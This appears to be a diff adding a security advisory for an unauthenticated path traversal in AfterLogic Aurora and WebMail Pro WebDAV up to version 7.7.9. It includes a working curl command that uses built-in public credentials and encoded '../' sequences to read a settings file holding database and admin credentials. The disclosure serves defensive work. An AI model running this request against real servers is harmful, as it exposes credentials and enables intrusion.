@@ -1,0 +1,46 @@
+# **Report Title:** Exposure of sensitive information to an unauthorized actor with path traversal on AfterLogic Aurora & WebMail Pro WebDAV EndPoint
+
+**The severity of the issue:** High
+
+**Complexity:** Easy
+
+**Affected Products:** AfterLogic Aurora, AfterLogic WebMail PRO
+
+**Authentication:** Not required
+
+**Attacks:**  Directory Traversal, Public Built-in Credentials For Critical Function
+
+## **Resources :**
+
+https://owasp.org/www-community/attacks/Path_Traversal
+
+## **Authors :**
+
+* Emre KELEŞ - @emrekeles on twitter
+* Emircan YILDIZ - @scorpsec on twitter
+* Halil Emre ÖZEN - @halilemreozen on twitter
+
+## **Report Summary :**
+
+AfterLogic Aurora and WebMail Pro products with 7.7.9 and all lower versions are affected by this vulnerability, simply sending an HTTP GET request to WebDAV EndPoint with built-in “caldav_public_user@localhost” and it’s the predefined password “caldav_public_user” allows the attacker to read all files under the web root.
+
+## **To Reproduce :**
+
+Read any file with the following curl command
+
+``` shell
+curl -u 'caldav_public_user@localhost:caldav_public_user' "https://sample-mail.tld/dav/server.php/files/personal/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data/settings/settings.xml"
+```
+
+The sample curl command will get the license key, database credentials, admin panel credentials, etc
+
+## **Technical Description:**
+
+* dav\server.php (handles the request, create the \afterlogic\DAV\Server instance )
+* \libraries\Sabre\DAV\server.php -> exec (Pass the request method and uri to * invokeMethod)
+* \libraries\Sabre\DAV\server.php -> invokeMethod 
+* \libraries\Sabre\DAV\server.php -> httpGet
+
+Directory Traversal problem starts on step 2 / exec, it doesn’t sanitize given parameters and checks the file extension when it’s combined the httpGet business login ( reading file content and returning ) the attacker able to read any file under the webroot.
+
+With the above problem any loggable user can read configuration files, with the caldav_public_user@localhost users, attackers don’t need any user info because it has a predefined password, so vulnerability becomes publicly accessible.
